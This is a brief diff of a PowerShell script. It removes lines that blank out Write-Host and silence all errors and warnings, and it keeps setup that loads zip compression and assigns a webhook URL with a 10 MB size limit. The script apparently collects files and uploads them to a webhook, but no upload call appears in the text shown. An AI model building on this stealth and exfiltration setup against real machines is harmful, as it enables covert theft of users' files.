@@ -1,5 +1,3 @@
-function Write-Host {$null};$PSDefaultParameterValues['*:ErrorAction']='SilentlyContinue';$PSDefaultParameterValues['*:WarningAction']='SilentlyContinue';*>$null;
-
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $WebhookUrl = $dc
 $MaxZipSize = 10MB
